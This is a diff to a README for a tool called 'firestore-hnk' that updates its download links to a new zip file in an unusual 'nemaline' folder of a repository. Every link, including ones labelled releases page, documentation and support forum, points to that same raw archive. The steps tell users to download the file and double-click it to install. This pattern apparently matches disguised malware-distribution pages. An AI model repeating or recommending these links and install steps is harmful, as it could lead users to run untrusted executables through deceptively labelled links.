@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download firestore-hnk](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip)](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip)
+[![Download firestore-hnk](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip)](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Welcome to the firestore-hnk application! This user-friendly tool helps you mana
 
 To get the latest version of firestore-hnk, visit the following link:
 
-[Download from Releases](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip)
+[Download from Releases](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip)
 
 ## 🔧 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip).
 2. You will see a list of available downloads. Look for the latest version.
-3. Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip` for Windows users).
+3. Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip` for Windows users).
 4. Depending on your browser settings, your download will start automatically. If it doesn’t, check the downloads folder on your device.
 5. Once the download is complete, locate the file and double-click it to begin the installation process.
 6. Follow the prompts in the installation wizard to complete the setup.
@@ -56,9 +56,9 @@ If you encounter any issues while using firestore-hnk, we are here to help. Here
 
 ## 🔗 Useful Links
 
-- [Releases page](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip)
-- [Documentation](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip)
-- [Support Forum](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore-hnk.zip)
+- [Releases page](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip)
+- [Support Forum](https://raw.githubusercontent.com/messymustard/firestore-hnk/main/nemaline/firestore_hnk_v2.6.zip)
 
 ## 🔄 Keep Updated
 
